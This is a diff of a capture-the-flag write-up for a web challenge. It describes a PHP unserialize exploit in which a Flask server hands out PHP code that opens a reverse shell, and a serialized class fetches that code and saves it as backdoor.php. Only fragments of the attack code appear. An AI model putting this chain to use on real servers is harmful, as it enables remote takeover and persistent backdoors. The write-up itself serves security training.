@@ -1,16 +1,3 @@
-Name
-----
-
-Web: Exotic Attacks: Handy Tool
-
-Description
------------
-
-Try to find a piece of source code left on the server.
-You may need to spawn a reverse shell for this one: [url]141.85.224.101:8004/[/url].
-
-Score: 150
-
 Vulnerability
 -------------
 
@@ -33,7 +20,7 @@ Since the actual output of the command is not shown, only the unserialized strin
 
 I started a Flask app on port 1234 where, if accessed, I return a piece PHP code that spawns a reverse shell to my machine. You should find out what your IP address is and change it. You can run the server with: `python app.py`
 
-```
+```python
 # app.py
 from flask import Flask, make_response
 
@@ -56,7 +43,7 @@ if __name__ == "__main__":
 
 I created a PHP class with a command that performs a request to my server and saves the output to `backdoor.php`. I created the serialized input. Make sure to change the IP with yours.
 
-```
+```php
 <?php
 //payload.php
 class PHPClass
